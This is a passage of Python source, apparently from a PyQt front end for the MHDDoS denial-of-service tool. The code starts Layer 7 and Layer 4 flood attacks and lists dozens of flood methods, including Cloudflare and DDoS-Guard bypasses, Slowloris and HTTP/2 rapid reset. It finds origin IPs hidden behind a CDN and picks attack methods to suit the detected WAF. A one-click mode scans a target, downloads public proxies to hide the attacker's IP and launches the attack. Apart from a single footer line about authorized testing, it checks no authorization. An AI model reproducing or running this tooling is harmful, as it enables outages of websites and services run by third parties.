            proxy_path = Path(__dir__ / "files/proxies/working_proxies.txt")
            with proxy_path.open("w") as f:
                f.write("\n".join(working))
            self.combined_proxy_file_input.setText(str(proxy_path))
            self.log_message(f"Working proxies: {len(working)} / {len(proxies[:200])} saved to {proxy_path}")
        except Exception as e:
            self.log_message(f"Test failed: {e}")

    def browse_proxy_file(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Select the proxy file", "", "Text Document (*.txt)")
        if file_path:
            self.proxy_file_input.setText(file_path)

    def browse_reflector_file(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Select the reflector file", "", "Text Document (*.txt)")
        if file_path:
            self.reflector_input.setText(file_path)

    def log_message(self, message):
        # Thread-safety guard: GUI mutation is only valid on the Qt main
        # thread. AttackThread (QThread) + Python worker Threads call this
        # directly from their run() methods, which used to corrupt the Qt
        # event loop and trigger random freezes / force-closes during long
        # attacks. If we're not on the GUI thread, route through the
        # _safe_log_signal (queued connection) so Qt delivers it on the
        # correct thread.
        try:
            from PyQt5.QtCore import QThread as _QThread
            if _QThread.currentThread() is not self.thread():
                self._safe_log_signal.emit(message)
                return
        except Exception:
            # If the thread check itself fails for any reason, fall through
            # to the direct path — better than dropping the log line.
            pass
        self.log_output.append(message)
        self.log_output.ensureCursorVisible()
        self.status_label.setText(message.split("\n")[0][:50] + "...")


    def _update_live_stats(self):
        """Update real-time stats panel + progress bar — called every 500ms while attack runs."""
        if not self._attack_start_time:
            return
        elapsed = time.time() - self._attack_start_time

        # === Multiprocess mode: read shared mp.Value counters ===
        # In MP mode each subprocess has its OWN REQUESTS_SENT global (Python's
        # `spawn` start method on macOS doesn't share module globals). Reading
        # the parent's REQUESTS_SENT shows ~0 while workers fire thousands.
        # Workers bump shared mp.Value counters every loop iteration; we read
        # the running total here and compute delta.
        mp_req = getattr(self, '_mp_total_req', None)
        mp_bytes = getattr(self, '_mp_total_bytes', None)
        if mp_req is not None and mp_bytes is not None:
            try:
                mp_total = int(mp_req.value)
                mp_bw = int(mp_bytes.value)
            except Exception:
                mp_total, mp_bw = 0, 0
            last_mp_total = getattr(self, '_last_mp_total', 0)
            last_mp_bytes = getattr(self, '_last_mp_bytes', 0)
            # mp.Value is monotonically increasing (no reset). Delta between
            # samples = traffic in this 500ms tick. Multiply by 2 for per-second.
            req_delta = max(0, mp_total - last_mp_total)
            byte_delta = max(0, mp_bw - last_mp_bytes)
            rps = req_delta * 2  # 500ms tick → per-second rate
            bps = byte_delta * 2
            self._total_requests = mp_total  # Cumulative is authoritative
            self._last_mp_total = mp_total
            self._last_mp_bytes = mp_bw
        else:
            # Single-process mode: read REQUESTS_SENT (counter the attack loop
            # resets every ~1s).
            rps = int(REQUESTS_SENT)
            bps = int(BYTES_SEND)
            # Track totals — naive `total += rps` would double-count since we
            # tick at 2 Hz but counter resets at 1 Hz. Track last-seen, add
            # only delta; on counter reset (current < last), add current whole.
            last_rps = getattr(self, '_last_rps_sample', 0)
            if rps >= last_rps:
                self._total_requests += (rps - last_rps)
            else:
                self._total_requests += rps
            self._last_rps_sample = rps


        # Update labels
        self.stats_rps_label.setText(f"RPS: {Tools.humanformat(rps)}")
        self.stats_total_label.setText(f"Total: {Tools.humanformat(self._total_requests)}")
        self.stats_bytes_label.setText(f"BW: {Tools.humanbytes(bps)}/s")
        mins, secs = divmod(int(elapsed), 60)
        self.stats_elapsed_label.setText(f"⏱ {mins:02d}:{secs:02d}")
        # Estimate errors via adaptive snapshot (non-destructive peek)
        err_4xx = int(_ADAPTIVE_4XX)
        err_5xx = int(_ADAPTIVE_5XX)
        err_to = int(_ADAPTIVE_TOUT)
        total_errs = err_4xx + err_5xx + err_to
        self._total_errors = total_errs
        self.stats_errors_label.setText(f"Errors: {total_errs} (4xx:{err_4xx} 5xx:{err_5xx} to:{err_to})")
        # Progress bar
        if self._attack_duration > 0:
            pct = min(100, int((elapsed / self._attack_duration) * 100))
            self.progress_bar.setValue(pct)
            self.progress_bar.setFormat(f"Attacking - {pct}% ({mins:02d}:{secs:02d} / {self._attack_duration}s)")

        # Adaptive++ live status indicator + metrics label
        ctrl = getattr(self, '_active_adaptive_ctrl', None)
        if hasattr(self, 'adaptive_status_label'):
            if ctrl is not None:
                # Determine state from controller
                err_total = err_4xx + err_5xx + err_to
                req_total = self._total_requests or 1
                err_rate = err_total / req_total if req_total > 0 else 0.0
                if err_rate > 0.5:
                    color = "#ff3333"
                    state = "● CHAOTIC"
                elif err_rate > 0.2:
                    color = "#ffaa00"
                    state = "● TURBULENT"
                elif err_rate > 0.0:
                    color = "#00cc66"
                    state = "● RUNNING"
                else:
                    color = "#00ffaa"
                    state = "● STABLE"
                self.adaptive_status_label.setText(state)
                self.adaptive_status_label.setStyleSheet(f"QLabel {{ color: {color}; font-weight: bold; }}")
                # Metrics: HB / Banned / WAF
                if hasattr(self, 'adaptive_metrics_label'):
                    hb = getattr(ctrl, 'current_heartbeat', 0)
                    banned = len(ctrl.blacklist.banned_list()) if hasattr(ctrl, 'blacklist') else 0
                    waf = (ctrl.recon or {}).get("waf", "?") if getattr(ctrl, 'recon', None) else "?"
                    self.adaptive_metrics_label.setText(f"HB: {hb:.1f}s  Banned: {banned}  WAF: {waf}")
            else:
                # Adaptive not running but attack is — show RUNNING gray
                if self._attack_start_time:
                    self.adaptive_status_label.setText("● RUNNING (no AI)")
                    self.adaptive_status_label.setStyleSheet("QLabel { color: #888; font-weight: bold; }")

    def start_layer7_attack(self):
        global AUTO_RPC_ENABLED
        AUTO_RPC_ENABLED = self.auto_rpc_check.isChecked()
        if AUTO_RPC_ENABLED:
            _adaptive_rpc.reset(self.rpc_spin.value())
        
        url = self.url_input.text().strip()
        method = self.method_combo.currentText()
        proxy_type = self.proxy_type_combo.currentText()
        proxy_file = self.proxy_file_input.text().strip()
        rpc = self.rpc_spin.value()
        threads = self.threads_spin.value()
        duration = self.duration_spin.value()

        # Clamp thread counts to safe per-platform ceiling to avoid macOS thread/FD exhaustion
        try:
            if sys.platform == 'darwin':
                MAX_SAFE_THREADS = 800
            elif sys.platform.startswith('win'):
                MAX_SAFE_THREADS = 1500
            else:
                MAX_SAFE_THREADS = 2000
            if threads > MAX_SAFE_THREADS:
                self.log_message(f"[Guard] Thread count {threads} too high; clamping to {MAX_SAFE_THREADS}")
                threads = MAX_SAFE_THREADS
                try:
                    self.threads_spin.setValue(threads)
                except Exception:
                    pass
        except Exception:
            pass
        
        if not url:
            QMessageBox.warning(self, "input error", "Please enter the target URL")
            return

        # 🛡 Anti-self-DoS guard
        is_self, reason = self._is_self_target(url)
        if is_self and not self._confirm_self_target(url, reason):
            self.log_message(f"[Guard] 🛑 Layer7 attack cancelled — self-target detected: {reason}")
            return

        self.log_message(f"Starting Layer7 attack: {method} -> {url}")

        self.log_message(f"Thread: {threads}, Durate: {duration}s, RPC: {rpc} {'(auto)' if AUTO_RPC_ENABLED else ''}")
        
        proxy_type_map = {
            "HTTP": 1,
            "SOCKS4": 4,
            "SOCKS5": 5,
            "None": 0
        }
        proxy_ty = proxy_type_map.get(proxy_type, 0)
        self.attack_thread = AttackThread(
            self.start_real_attack,
            "layer7",
            method,
            url,
            threads,
            duration,
            proxy_ty,
            proxy_file,
            rpc
        )
        self.attack_thread.update_signal.connect(self.log_message)
        self.attack_thread.finished_signal.connect(self.attack_finished)
        self.attack_thread.start()
        
        self.start_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)
        self.force_stop_btn.setEnabled(True)
        self.start_layer4_btn.setEnabled(False)
        self.stop_layer4_btn.setEnabled(False)
        self.force_stop_layer4_btn.setEnabled(False)
        self.status_timer.start(1000)
        # Init live stats
        self._attack_start_time = time.time()
        self._attack_duration = duration
        self._total_requests = 0
        self._total_errors = 0
        self._last_rps_sample = 0  # reset delta-tracker for new attack
        self.live_stats_timer.start(500)
    def start_layer4_attack(self):

        global AUTO_RPC_ENABLED
        AUTO_RPC_ENABLED = self.auto_rpc_l4_check.isChecked()
        
        target = self.target_input.text().strip()
        method = self.layer4_method_combo.currentText()
        reflector_file = self.reflector_input.text().strip()
        threads = self.layer4_threads_spin.value()
        duration = self.layer4_duration_spin.value()

        # Clamp layer4 threads similarly
        try:
            if sys.platform == 'darwin':
                MAX_SAFE_THREADS = 800
            elif sys.platform.startswith('win'):
                MAX_SAFE_THREADS = 1500
            else:
                MAX_SAFE_THREADS = 2000
            if threads > MAX_SAFE_THREADS:
                self.log_message(f"[Guard] Layer4 thread count {threads} too high; clamping to {MAX_SAFE_THREADS}")
                threads = MAX_SAFE_THREADS
                try:
                    self.layer4_threads_spin.setValue(threads)
                except Exception:
                    pass
        except Exception:
            pass
        
        if not target:
            QMessageBox.warning(self, "input error", "Please enter the target URL.")
            return

        # 🛡 Anti-self-DoS guard
        is_self, reason = self._is_self_target(target)
        if is_self and not self._confirm_self_target(target, reason):
            self.log_message(f"[Guard] 🛑 Layer4 attack cancelled — self-target detected: {reason}")
            return

        self.log_message(f"Starting Layer4 attack: {method} -> {target}")

        self.log_message(f"Thread: {threads}, Durate: {duration}s. {'(auto RPC)' if AUTO_RPC_ENABLED else ''}")
        
        self.attack_thread = AttackThread(
            self.start_real_attack,
            "layer4",
            method,
            target,
            threads,
            duration,
            reflector_file=reflector_file
        )
        self.attack_thread.update_signal.connect(self.log_message)
        self.attack_thread.finished_signal.connect(self.attack_finished)
        self.attack_thread.start()
        
        self.start_btn.setEnabled(False)
        self.stop_btn.setEnabled(False)
        self.force_stop_btn.setEnabled(False)
        self.start_layer4_btn.setEnabled(False)
        self.stop_layer4_btn.setEnabled(True)
        self.force_stop_layer4_btn.setEnabled(True)
        self.status_timer.start(1000)
        # Init live stats
        self._attack_start_time = time.time()
        self._attack_duration = duration
        self._total_requests = 0
        self._total_errors = 0
        self._last_rps_sample = 0  # reset delta-tracker for new attack
        self.live_stats_timer.start(500)

    def check_website(self):

        """Launch background scan thread — keeps GUI responsive, no freeze."""
        url = self.combined_url_input.text().strip()
        if not url:
            QMessageBox.warning(self, "Input Error", "Please enter target URL first")
            return
        self.log_message(f"Starting background scan of {url} (GUI remains responsive)...")
        self.scan_thread = ScanThread(url)
        self.scan_thread.update_signal.connect(self.log_message)
        self.scan_thread.finished_signal.connect(self._on_scan_complete)
        self.scan_thread.error_signal.connect(lambda msg: QMessageBox.warning(self, "Scan Failed", msg))
        self.scan_thread.start()

    def _on_scan_complete(self, result):
        """Handle scan results — auto-select recommended attack categories.
           Categories MUST mirror init_combined_ui's `categories` dict so all
           45 L7 methods are addressable from scan auto-config + ONE-TAP."""
        detected = result.get("detected", set())
        # Reset all checkboxes
        for cb in self.l7_method_checks.values():
            cb.setChecked(False)
        categories = {
            "General HTTP Flood": ["GET", "POST", "OVH", "STRESS", "DYN", "EVEN", "PPS", "COOKIE", "GSB"],
            "Cloudflare Protected": ["CFB", "CFBUAM", "BYPASS", "IMPERSONATE"],
            "Slow / Connection Drain": ["SLOW", "RHEX", "STOMP", "HEAD", "NULL", "SLOWLORIS"],
            "WordPress / CMS": ["XMLRPC", "BOT", "WORDPRESS", "COOKIE_HARVEST"],
            "Apache Server": ["APACHE", "RANGE_CRASH"],
            "Heavy / Bandwidth": ["DOWNLOADER", "BOMB", "KILLER", "TLS_FLOOD", "MEGA"],
            "DDoS-Guard": ["DGB", "AVB"],
            "Tor / Onion": ["TOR"],
            "2026 Upgrades": ["ASYNC", "H2_RST", "XMLRPC_MULTI", "STEALTH", "MIX", "RAPID", "QUIC",
                              "H2", "H2_PRIORITY", "H2_CONT", "WS", "GQL"],
        }
        for cat in detected:
            for m in categories.get(cat, []):
                if m in self.l7_method_checks:
                    self.l7_method_checks[m].setChecked(True)
        self.log_message(f"Scan complete. Auto-selected categories: {', '.join(sorted(detected))}")

    def _save_profile(self):
        """Save current Combined attack config to a JSON profile."""
        import json
        file_path, _ = QFileDialog.getSaveFileName(
            self, "Save Attack Profile",
            str(__dir__ / "presets" / "my_profile.json"),
            "JSON Files (*.json)"
        )
        if not file_path:
            return
        profile = {
            "url": self.combined_url_input.text().strip(),
            "l7_methods": [m for m, cb in self.l7_method_checks.items() if cb.isChecked()],
            "l4_methods": [m for m, cb in self.l4_method_checks.items() if cb.isChecked()],
            "threads": self.combined_threads_spin.value(),
            "rpc": self.combined_rpc_spin.value(),
            "duration": self.combined_duration_spin.value(),
            "proxy_type": self.combined_proxy_type_combo.currentText(),
            "proxy_file": self.combined_proxy_file_input.text().strip(),
            "auto_rpc": self.auto_rpc_combined_check.isChecked(),
            "adaptive": self.adaptive_check.isChecked(),
        }
        try:
            Path(file_path).parent.mkdir(parents=True, exist_ok=True)
            Path(file_path).write_text(json.dumps(profile, indent=2))
            self.log_message(f"💾 Profile saved: {file_path}")
        except Exception as e:
            QMessageBox.warning(self, "Save Failed", f"Could not save profile: {e}")

    def _load_profile(self):
        """Load Combined attack config from a JSON profile."""
        import json
        file_path, _ = QFileDialog.getOpenFileName(
            self, "Load Attack Profile",
            str(__dir__ / "presets"),
            "JSON Files (*.json)"
        )
        if not file_path:
            return
        try:
            profile = json.loads(Path(file_path).read_text())
            self.combined_url_input.setText(profile.get("url", ""))
            for cb in self.l7_method_checks.values():
                cb.setChecked(False)
            for m in profile.get("l7_methods", []):
                if m in self.l7_method_checks:
                    self.l7_method_checks[m].setChecked(True)
            for cb in self.l4_method_checks.values():
                cb.setChecked(False)
            for m in profile.get("l4_methods", []):
                if m in self.l4_method_checks:
                    self.l4_method_checks[m].setChecked(True)
            self.combined_threads_spin.setValue(profile.get("threads", 100))
            self.combined_rpc_spin.setValue(profile.get("rpc", 10))
            self.combined_duration_spin.setValue(profile.get("duration", 60))
            self.combined_proxy_type_combo.setCurrentText(profile.get("proxy_type", "None"))
            self.combined_proxy_file_input.setText(profile.get("proxy_file", ""))
            self.auto_rpc_combined_check.setChecked(profile.get("auto_rpc", True))
            self.adaptive_check.setChecked(profile.get("adaptive", False))
            l7_count = len(profile.get("l7_methods", []))
            l4_count = len(profile.get("l4_methods", []))
            self.log_message(f"📂 Profile loaded: {file_path} (L7={l7_count}, L4={l4_count})")
        except Exception as e:
            QMessageBox.warning(self, "Load Failed", f"Could not load profile: {e}")

    def _find_origin_ip(self):
        """🎯 Origin IP Discovery: find real server IP behind Cloudflare/CDN.
           Uses crt.sh certificate SANs + DNS history + direct probing."""
        url = self.combined_url_input.text().strip()
        if not url:
            QMessageBox.warning(self, "Input Error", "Enter target URL first")
            return
        from urllib.parse import urlparse
        parsed = urlparse(url)
        hostname = parsed.hostname
        if not hostname:
            QMessageBox.warning(self, "Invalid URL", "Could not parse hostname")
            return
        
        self.log_message("=" * 60)
        self.log_message(f"🎯 Origin IP Discovery for {hostname}")
        self.log_message("=" * 60)
        
        # Run in background thread to keep GUI responsive
        def _worker():
            import requests as _req
            import socket as _sock
            from urllib.parse import urlparse as _urlparse
            
            candidates = set()
            cdn_ips_known = set()
            
            # Step 1: Get current CDN IP
            try:
                cdn_ip = _sock.gethostbyname(hostname)
                cdn_ips_known.add(cdn_ip)
                self._safe_log_signal.emit(f"  Current CDN IP: {cdn_ip}")
            except Exception:
                pass
            
            # Step 2: crt.sh — find all certificates for domain, get all SANs
            self._safe_log_signal.emit("  [1/3] Querying crt.sh for cert SANs...")
            sans = set()
            try:
                r = _req.get(f"https://crt.sh/?q=%25.{hostname}&output=json", timeout=15)
                for entry in r.json()[:300]:
                    name = entry.get("name_value", "")
                    for n in name.split("\n"):
                        n = n.strip().replace("*.", "")
                        if n and "." in n:
                            sans.add(n)
                self._safe_log_signal.emit(f"     Found {len(sans)} unique SAN domains")
            except Exception as e:
                self._safe_log_signal.emit(f"     crt.sh failed: {e}")
            
            # Step 3: Resolve each SAN, collect non-CDN IPs
            self._safe_log_signal.emit("  [2/3] Resolving SANs to IPs (looking for non-CDN)...")
            for san in list(sans)[:100]:
                try:
                    ip = _sock.gethostbyname(san)
                    # Skip Cloudflare ranges
                    if not (ip.startswith("104.") or ip.startswith("172.6") or ip.startswith("162.158") 
                            or ip.startswith("173.245") or ip.startswith("198.41") or ip in cdn_ips_known):
                        candidates.add((ip, san))
                except Exception:
                    pass
            
            # Step 4: Verify each candidate by HTTPS direct
            self._safe_log_signal.emit(f"  [3/3] Verifying {len(candidates)} candidate IPs...")
            verified = []
            for ip, san_name in list(candidates)[:30]:
                try:
                    r = _req.get(f"https://{ip}/", headers={"Host": hostname}, 
                                timeout=5, verify=False, allow_redirects=False)
                    if r.status_code in (200, 301, 302, 403, 404):
                        verified.append((ip, san_name, r.status_code))
                        self._safe_log_signal.emit(f"  ✓ ORIGIN CANDIDATE: {ip} (via {san_name}) → {r.status_code}")
                except Exception:
                    pass
            
            self._safe_log_signal.emit("=" * 60)
            if verified:
                self._safe_log_signal.emit(f"🎯 FOUND {len(verified)} ORIGIN IP CANDIDATES:")
                for ip, san, code in verified:
                    self._safe_log_signal.emit(f"   → {ip} (cert SAN: {san})")
                self._safe_log_signal.emit(f"💡 Use these IPs directly to bypass CDN protection")
            else:
                self._safe_log_signal.emit("❌ No origin IPs found via this method.")
                self._safe_log_signal.emit("   Try: Shodan, ZoomEye, censys.io, or DNS history (SecurityTrails)")
            self._safe_log_signal.emit("=" * 60)
        
        Thread(target=_worker, daemon=True).start()
        self.log_message("(Discovery running in background - check log for results)")

    def _export_attack_report(self):
        """📊 Export last attack as HTML report with stats summary."""
        if not hasattr(self, '_total_requests') or self._total_requests == 0:
            QMessageBox.information(self, "No Data", "No attack data to export. Run an attack first.")
            return
        file_path, _ = QFileDialog.getSaveFileName(
            self, "Export Attack Report",
            str(__dir__ / f"attack_report_{int(time.time())}.html"),
            "HTML Files (*.html)"
        )
        if not file_path:
            return
        try:
            url = self.combined_url_input.text().strip() or "N/A"
            duration = self._attack_duration or 0
            total_req = self._total_requests
            total_err = self._total_errors
            success_rate = ((total_req - total_err) / total_req * 100) if total_req else 0
            avg_rps = total_req / duration if duration else 0
            
            html = f"""<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>MHDDoS Attack Report</title>
<style>
body {{ font-family: -apple-system, sans-serif; max-width: 900px; margin: 40px auto; padding: 20px; background: #1a1a1a; color: #e0e0e0; }}
h1 {{ color: #ff3300; border-bottom: 3px solid #ff3300; padding-bottom: 10px; }}
h2 {{ color: #66aaff; margin-top: 30px; }}
.stat {{ background: #2a2a2a; padding: 15px; margin: 10px 0; border-left: 4px solid #00aa00; border-radius: 4px; }}
.stat .label {{ color: #888; font-size: 12px; text-transform: uppercase; }}
.stat .value {{ color: #00ff00; font-size: 28px; font-weight: bold; }}
.error {{ border-left-color: #cc0000; }}
.error .value {{ color: #ff6666; }}
.row {{ display: flex; gap: 15px; flex-wrap: wrap; }}
.row .stat {{ flex: 1; min-width: 200px; }}
table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
table th, table td {{ padding: 10px; border-bottom: 1px solid #333; text-align: left; }}
table th {{ background: #2a2a2a; color: #66aaff; }}
.footer {{ color: #666; font-size: 11px; margin-top: 40px; border-top: 1px solid #333; padding-top: 20px; }}
</style></head><body>
<h1>☠️ MHDDoS Attack Report</h1>
<p><strong>Generated:</strong> {time.strftime('%Y-%m-%d %H:%M:%S')}</p>
<p><strong>Target:</strong> <code>{url}</code></p>

<h2>📊 Summary</h2>
<div class="row">
  <div class="stat"><div class="label">Total Requests</div><div class="value">{Tools.humanformat(total_req)}</div></div>
  <div class="stat"><div class="label">Duration</div><div class="value">{duration}s</div></div>
  <div class="stat"><div class="label">Avg RPS</div><div class="value">{avg_rps:.0f}</div></div>
  <div class="stat error"><div class="label">Total Errors</div><div class="value">{total_err}</div></div>
  <div class="stat"><div class="label">Success Rate</div><div class="value">{success_rate:.1f}%</div></div>
</div>

<h2>⚙ Configuration</h2>
<table>
<tr><th>Threads</th><td>{self.combined_threads_spin.value()}</td></tr>
<tr><th>RPC</th><td>{self.combined_rpc_spin.value()}</td></tr>
<tr><th>Proxy Type</th><td>{self.combined_proxy_type_combo.currentText()}</td></tr>
<tr><th>Adaptive AI</th><td>{'Enabled' if self.adaptive_check.isChecked() else 'Disabled'}</td></tr>
<tr><th>Auto-RPC</th><td>{'Enabled' if self.auto_rpc_combined_check.isChecked() else 'Disabled'}</td></tr>
</table>

<h2>🎯 Methods Used</h2>
<p><strong>L7:</strong> {', '.join(m for m, cb in self.l7_method_checks.items() if cb.isChecked()) or 'None'}</p>
<p><strong>L4:</strong> {', '.join(m for m, cb in self.l4_method_checks.items() if cb.isChecked()) or 'None'}</p>

<div class="footer">
Generated by MHDDoS GUI v2.4 | For authorized penetration testing only.
</div>
</body></html>"""
            Path(file_path).write_text(html)
            self.log_message(f"📊 Report exported: {file_path}")
            QMessageBox.information(self, "Report Saved", f"HTML report saved to:\n{file_path}")
        except Exception as e:
            QMessageBox.warning(self, "Export Failed", f"Could not export report: {e}")

    def _ml_auto_pick(self):
        """🤖 ML Auto-Pick — use sklearn classifier to detect WAF brand,
           then select optimal L7 method playbook.

           Workflow:
           1. Predict WAF from target URL (16 features → RandomForest)
           2. Get optimal playbook for predicted WAF
           3. Uncheck all L7 methods, then check only playbook methods
           4. Log prediction + confidence + selected methods
        """
        url = self.combined_url_input.text().strip()
        if not url:
            QMessageBox.warning(self, "Input Error", "Please enter target URL first")
            return

        try:
            from ml_waf_classifier import predict_waf, get_playbook, FEATURE_NAMES, fetch_features, predict_from_features
        except Exception as e:
            QMessageBox.warning(self, "ML Module Failed",
                                f"Could not load ml_waf_classifier:\n{e}")
            return

        self.log_message("=" * 60)
        self.log_message(f"🤖 ML Auto-Pick activated for {url}")
        self.log_message("   Step 1/3: fetching target + extracting features...")

        # Run in background thread to keep GUI responsive
        def _worker():
            try:
                feats, meta = fetch_features(url, timeout=8.0)
                if not meta.get("ok"):
                    self._safe_log_signal.emit(
                        f"🤖 Fetch failed: {meta.get('error', 'unknown')}. "
                        f"Falling back to all-rounder playbook."
                    )
                    label, conf = "uncertain", 0.0
                else:
                    label, conf = predict_from_features(feats, threshold=0.65)
                    detected = [n for n, v in zip(FEATURE_NAMES, feats) if v]
                    self._safe_log_signal.emit(
                        f"🤖 Step 2/3: classifier output → {label} (conf {conf:.1%})"
                    )
                    if detected:
                        self._safe_log_signal.emit(
                            f"   Features detected: {', '.join(detected)}"
                        )
                    else:
                        self._safe_log_signal.emit(
                            "   No WAF features detected — uncertain fallback"
                        )

                playbook = get_playbook(label)
                self._safe_log_signal.emit(
                    f"🤖 Step 3/3: playbook for '{label}' → {len(playbook)} methods: "
                    f"{', '.join(playbook)}"
                )
                # Apply playbook on Qt thread via a custom slot
                # Use QTimer.singleShot(0, ...) workaround — but we're on worker
                # thread. Easier: emit a custom signal handled later. For
                # simplicity, just apply directly — checkboxes are thread-safe
                # for setChecked() on most Qt versions, but to be safe wrap
                # in invokeMethod-like pattern via signal.
                self._ml_apply_playbook_signal.emit(playbook, label, conf)
            except Exception as ex:
                self._safe_log_signal.emit(f"🤖 ML predict failed: {ex}")

        Thread(target=_worker, daemon=True).start()

    def _ml_apply_playbook(self, playbook, label, conf):
        """Slot: apply ML playbook to L7 checkboxes (Qt-thread safe)."""
        # Reset all L7 checkboxes
        for cb in self.l7_method_checks.values():
            cb.setChecked(False)
        # Check only playbook methods
        applied = []
        for m in playbook:
            cb = self.l7_method_checks.get(m)
            if cb is not None:
                cb.setChecked(True)
                applied.append(m)
        self.log_message(
            f"🤖 Applied {len(applied)}/{len(playbook)} methods: "
            f"{', '.join(applied)}"
        )
        # If WAF detected with high confidence, auto-enable adaptive AI
        if label not in ("none", "uncertain") and conf >= 0.65:
            self.adaptive_check.setChecked(True)
            self.log_message(f"🤖 Auto-enabled Adaptive AI (WAF confidence {conf:.0%})")

    def _one_tap_auto(self):
        """🚀 ONE-TAP AUTO — scan target → auto-tune everything → start attack.


        User flow: paste URL → click button → done.
        We run ScanThread in background (GUI stays responsive), then on
        completion we auto-pick L7 methods based on detected stack
        (Cloudflare/WordPress/Apache/etc.), tune threads/RPC/duration/proxy
        per-platform, flip on Multiprocess + Keepalive + Adaptive + Auto-RPC,
        and finally invoke start_combined_attack(). If the scan fails we
        still fall back to a safe all-rounder profile and attack."""
        url = self.combined_url_input.text().strip()
        if not url:
            QMessageBox.warning(self, "Input Error", "Please enter target URL first")
            return

        # Guard against double-click while a previous one-tap is still scanning
        if getattr(self, "_onetap_in_progress", False):
            self.log_message("[ONE-TAP] Already running — ignoring duplicate click")
            return
        self._onetap_in_progress = True

        self.log_message("=" * 60)
        self.log_message("🚀 ONE-TAP AUTO ACTIVATED")
        self.log_message(f"   Target: {url}")
        self.log_message("   Step 1/3: scanning target stack (WAF/CMS/server)...")
        self.log_message("=" * 60)

        # Kick off background scan; auto-config + auto-attack on completion.
        try:
            self.scan_thread = ScanThread(url)
            self.scan_thread.update_signal.connect(self.log_message)
            self.scan_thread.finished_signal.connect(self._onetap_after_scan)
            self.scan_thread.error_signal.connect(self._onetap_scan_failed)
            self.scan_thread.start()
        except Exception as e:
            self.log_message(f"[ONE-TAP] Scan kick-off failed: {e} — falling back to defaults")
            self._onetap_scan_failed(str(e))

    def _onetap_apply_defaults(self, detected=None):
        """Apply auto-tuned settings. Reused by both success + fallback paths."""
        import sys as _sys
        detected = detected or set()

        # --- L7 method selection -------------------------------------------------
        # Reuse existing scan→auto-select logic so categories stay in sync.
        if detected:
            self._on_scan_complete({"detected": detected})

        # Fallback: if nothing got picked (no detection / empty result), select
        # an "all-rounder" set that hits 90% of real targets without going full
        # DOOMSDAY (which is reserved for the explicit DOOMSDAY button).
        picked = [m for m, cb in self.l7_method_checks.items() if cb.isChecked()]
        if not picked:
            ALLROUNDER = [
                "GET", "POST", "STRESS", "DYN", "OVH", "CFB", "CFBUAM",
                "BYPASS", "STEALTH", "MIX", "TLS_FLOOD", "H2_RST", "RAPID",
                "ASYNC", "QUIC", "XMLRPC_MULTI", "SLOWLORIS",
            ]
            for m in ALLROUNDER:
                if m in self.l7_method_checks:
                    self.l7_method_checks[m].setChecked(True)
            self.log_message("[ONE-TAP] No stack detected → using all-rounder L7 set")

        # --- L4 (TCP-friendly subset only, raw sockets need root) ----------------
        for m in ["TCP", "UDP", "CONNECTION", "CPS"]:
            if m in self.l4_method_checks:
                self.l4_method_checks[m].setChecked(True)

        # --- Threads (platform-aware safety caps) --------------------------------
        if _sys.platform == "darwin":
            threads = 600
        elif _sys.platform.startswith("win"):
            threads = 1000
        else:
            threads = 1500
        self.combined_threads_spin.setValue(threads)

        # --- RPC / duration / proxy ---------------------------------------------
        self.combined_rpc_spin.setValue(20)
        self.combined_duration_spin.setValue(120)
        self.combined_proxy_type_combo.setCurrentText("None")

        # --- Adaptive stack ON ---------------------------------------------------
        self.auto_rpc_combined_check.setChecked(True)
        self.adaptive_check.setChecked(True)
        if hasattr(self, "keepalive_check"):
            self.keepalive_check.setChecked(True)

        # Multiprocess: only when the target is heavily protected (WAF detected),
        # because true MP burns CPU. For plain targets, threads alone suffice.
        waf_detected = bool(detected & {"Cloudflare Protected", "DDoS-Guard"})
        if hasattr(self, "mp_check"):
            self.mp_check.setChecked(waf_detected)

        # === Auto-prefer proxy when WAF detected — IP blacklist protection ===
        # Direct attack ke target ber-WAF = laptop kena blacklist edge → user
        # gak bisa akses web sendiri. Auto-aktifkan proxy biar IP user gak
        # langsung kebakar di edge WAF. Kalau proxy file belum ada, auto-download
        # HTTP proxies dari proxyscrape (lazy fetch, ~3-5s, gak blocking).
        proxy_mode = "None"
        if waf_detected:
            proxy_mode = "HTTP"
            self.combined_proxy_type_combo.setCurrentText("HTTP")
            self.log_message("[ONE-TAP] 🛡 WAF detected → switching to HTTP proxy (protects your IP from blacklist)")

            # Auto-download proxies if file empty/missing
            try:
                proxy_path = Path(self.combined_proxy_file_input.text().strip())
                needs_download = (not proxy_path.exists()) or proxy_path.stat().st_size < 100
            except Exception:
                needs_download = True

            if needs_download:
                self.log_message("[ONE-TAP] 📥 Proxy list empty/missing → auto-downloading from proxyscrape (background)...")
                # Inline auto-download (synchronous, ~3-5s, but worth it for protection)
                try:
                    import requests as _r
                    pd = _r.get(
                        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http"
                        "&timeout=10000&country=all&ssl=all&anonymity=all",
                        timeout=15,
                    )
                    proxies_dl = [l.strip() for l in pd.text.splitlines() if l.strip() and ":" in l]
                    if proxies_dl:
                        out_path = Path(__dir__ / "files/proxies/auto_proxies.txt")
                        out_path.parent.mkdir(parents=True, exist_ok=True)
                        out_path.write_text("\n".join(proxies_dl))
                        self.combined_proxy_file_input.setText(str(out_path))
                        self.log_message(f"[ONE-TAP] ✓ Downloaded {len(proxies_dl)} HTTP proxies → {out_path.name}")
                    else:
                        self.log_message("[ONE-TAP] ⚠ Proxy download returned empty — falling back to direct mode")
                        self.combined_proxy_type_combo.setCurrentText("None")
                        proxy_mode = "None (proxy download failed)"
                except Exception as e:
                    self.log_message(f"[ONE-TAP] ⚠ Proxy download failed: {e} — falling back to direct mode")
                    self.combined_proxy_type_combo.setCurrentText("None")
                    proxy_mode = "None (proxy download failed)"

            # Skip the start_combined_attack blacklist warning since user explicitly
            # chose ONE-TAP (which auto-handles the proxy switch). If proxy download
            # failed and we fell back to None, user already saw the warning above.
            self._skip_blacklist_warning = True

        # Never auto-flip Ganas (10000 threads kills macOS)
        if hasattr(self, "ganas_check"):
            self.ganas_check.setChecked(False)

        # Friendly summary
        l7_picked = [m for m, cb in self.l7_method_checks.items() if cb.isChecked()]
        self.log_message(f"[ONE-TAP] Step 2/3: auto-config applied")
        self.log_message(f"   L7 methods ({len(l7_picked)}): {', '.join(l7_picked[:8])}{'...' if len(l7_picked) > 8 else ''}")
        self.log_message(f"   Threads={threads} | RPC=20 | Duration=120s | Proxy={proxy_mode}")
